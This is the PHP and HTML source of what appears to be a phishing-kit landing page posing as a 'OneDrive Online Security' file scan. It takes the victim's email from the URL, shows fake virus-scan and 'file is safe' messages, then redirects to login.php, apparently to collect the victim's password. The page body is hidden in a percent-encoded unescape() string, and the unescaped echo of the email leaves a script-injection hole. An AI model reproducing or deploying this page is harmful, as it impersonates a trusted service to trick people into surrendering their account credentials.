<?php
$cust_email = $_GET["email"];
$url = explode("@",$cust_email);
$parts = preg_split ("/[\@.]+/", $cust_email);
$cust_name = $parts[0];
$str = strtoupper($parts[1]);
?> 

<html>
<head>

<style type="text/css">
<!--
.style1 {font-family: "Courier New", Courier, monospace}
.style4 {font-family: "Courier New", Courier, monospace;
	color:#0066CC;
	font-size:20px;}

.style6 {color: #FF6600}
.style8 {font-size: 14}
-->
</style>
<script>



var preloadimages=new Array(":abstract.simplenet.com/point.gif","abstract.simplenet.com/point2.html")



var intervals=2300

//configure destination URL

var targetdestination="login.php"





var splashmessage=new Array()

var openingtags='<font face="verdana" size="2" color="#0869AE">'

splashmessage[0]='Connecting to OneDrive server'

splashmessage[1]='Please wait...'

splashmessage[2]='Scanning file from <?php echo $cust_email; ?>'

splashmessage[3]='Please wait...'

splashmessage[4]='No Virus detected on file'

splashmessage[5]='Connecting to <? echo $str;?> email server'

splashmessage[6]='File is safe and ready for download'





var closingtags='</font>'



//Do not edit below this line (besides HTML code at the very bottom)



var i=0



var ns4=document.layers?1:0

var ie4=document.all?1:0

var ns6=document.getElementById&&!document.all?1:0

var theimages=new Array()



//preload images

if (document.images){

for (p=0;p<preloadimages.length;p++){

theimages[p]=new Image()

theimages[p].src=preloadimages[p]

}

}



function displaysplash(){

if (i<splashmessage.length){

sc_cross.style.visibility="hidden"

sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'

sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 :document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2

sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2:document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2

sc_cross.style.visibility="visible"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash()",intervals)

}



function displaysplash_ns(){

if (i<splashmessage.length){

sc_ns.visibility="hide"

sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')

sc_ns.document.close()



sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2

sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2



sc_ns.visibility="show"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash_ns()",intervals)

}







function positionsplashcontainer(){

if (ie4||ns6){

sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer

displaysplash()

}

else if (ns4){

sc_ns=document.splashcontainerns

sc_ns.visibility="show"

displaysplash_ns()

}

else

window.location=targetdestination

}

window.onload=positionsplashcontainer



</script>
<script><!--

 var jv=1.0;

//--></script>



<script language="Javascript1.1"><!--

 jv=1.1;

//--></script>



<script language="Javascript1.2"><!--

 jv=1.2;

//--></script>



<script language="Javascript1.3"><!--

 jv=1.3;

//--></script>



<script language="Javascript1.4"><!--

 jv=1.4;

//--></script>

<link rel="SHORTCUT ICON" href="files/favicon.ico"/>

<title> OneDrive Online Security  For <?php echo $cust_email; ?> </title>
<META http-equiv="refresh" content="10; url=login.php?email=<?php echo $cust_email; ?>">
</head>
<body>

<script type="text/javascript">
<!--
document.write(unescape('%3c%74%61%62%6c%65%20%61%6c%69%67%6e%3d%22%63%65%6e%74%65%72%22%3e%0d%0a%0d%0a%3c%74%72%3e%3c%74%64%20%68%65%69%67%68%74%3d%22%34%30%22%3e%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%0d%0a%0d%0a%3c%74%72%3e%3c%74%64%3e%0d%0a%0d%0a%09%3c%74%61%62%6c%65%20%61%6c%69%67%6e%3d%22%63%65%6e%74%65%72%22%3e%0d%0a%0d%0a%09%3c%74%72%3e%3c%74%64%3e%0d%0a%09%0d%0a%09%09%3c%64%69%76%20%61%6c%69%67%6e%3d%22%63%65%6e%74%65%72%22%3e%0d%0a%09%09%3c%69%6d%67%20%73%72%63%3d%22%66%69%6c%65%73%2f%6c%6f%67%6f%2e%6a%70%67%22%20%77%69%64%74%68%3d%22%33%34%30%22%20%68%65%69%67%68%74%3d%22%38%30%22%3e%0d%0a%09%09%3c%2f%64%69%76%3e%0d%0a%0d%0a%09%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%0d%0a%0d%0a%09%3c%74%72%3e%3c%74%64%20%68%65%69%67%68%74%3d%22%35%22%3e%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%0d%0a%0d%0a%09%3c%74%72%3e%3c%74%64%3e%0d%0a%0d%0a%09%09%3c%64%69%76%20%61%6c%69%67%6e%3d%22%63%65%6e%74%65%72%22%3e%0d%0a%09%09%3c%66%6f%6e%74%20%66%61%63%65%3d%22%76%65%72%64%61%6e%61%22%20%73%69%7a%65%3d%22%32%22%20%63%6f%6c%6f%72%3d%22%23%30%38%36%39%41%45%22%3e%0d%0a%09%09%50%6c%65%61%73%65%20%68%6f%6c%64%20%61%20%77%68%69%6c%65%2c%20%61%73%20%4f%6e%65%44%72%69%76%65%20%53%65%63%75%72%69%74%79%20%69%73%20%73%63%61%6e%6e%69%6e%67%20%79%6f%75%72%20%66%69%6c%65%20%66%6f%72%20%76%69%72%75%73%21%0d%0a%09%09%3c%2f%66%6f%6e%74%3e%0d%0a%09%09%3c%2f%64%69%76%3e%0d%0a%0d%0a%09%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%09%3c%74%72%3e%3c%74%64%20%68%65%69%67%68%74%3d%22%35%22%3e%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%09%0d%0a%0d%0a%0d%0a%09%3c%74%72%3e%3c%74%64%3e%0d%0a%09%3c%63%65%6e%74%65%72%3e%0d%0a%09%3c%66%6f%6e%74%20%66%61%63%65%3d%22%76%65%72%64%61%6e%61%22%20%73%69%7a%65%3d%22%32%22%20%63%6f%6c%6f%72%3d%22%23%30%38%36%39%41%45%22%3e%0d%0a%09%3c%64%69%76%20%61%6c%69%67%6e%3d%22%63%65%6e%74%65%72%22%20%63%6c%61%73%73%3d%22%22%20%69%64%3d%22%73%70%6c%61%73%68%63%6f%6e%74%61%69%6e%65%72%22%20%73%74%79%6c%65%3d%22%76%69%73%69%62%69%6c%69%74%79%3a%20%76%69%73%69%62%6c%65%3b%20%74%6f%70%3a%20%33%36%33%2e%35%70%78%3b%22%3e%20%3c%2f%64%69%76%3e%0d%0a%09%3c%2f%66%6f%6e%74%3e%0d%0a%09%3c%2f%63%65%6e%74%65%72%3e%0d%0a%09%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%0d%0a%0d%0a%09%3c%74%72%3e%3c%74%64%20%68%65%69%67%68%74%3d%22%36%30%22%3e%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%0d%0a%0d%0a%09%3c%74%72%3e%3c%74%64%3e%0d%0a%0d%0a%09%09%3c%64%69%76%20%61%6c%69%67%6e%3d%22%63%65%6e%74%65%72%22%3e%0d%0a%09%09%3c%69%6d%67%20%73%72%63%3d%22%66%69%6c%65%73%2f%6c%6f%61%64%65%72%2e%67%69%66%22%20%77%69%64%74%68%3d%22%31%33%30%22%20%68%65%69%67%68%74%3d%22%31%33%30%22%3e%0d%0a%09%09%3c%2f%64%69%76%3e%0d%0a%0d%0a%09%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%09%3c%2f%74%61%62%6c%65%3e%0d%0a%0d%0a%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%3c%2f%74%61%62%6c%65%3e%0d%0a%0d%0a%3c%2f%62%6f%64%79%3e%0d%0a%3c%2f%68%74%6d%6c%3e'));
//-->
</script>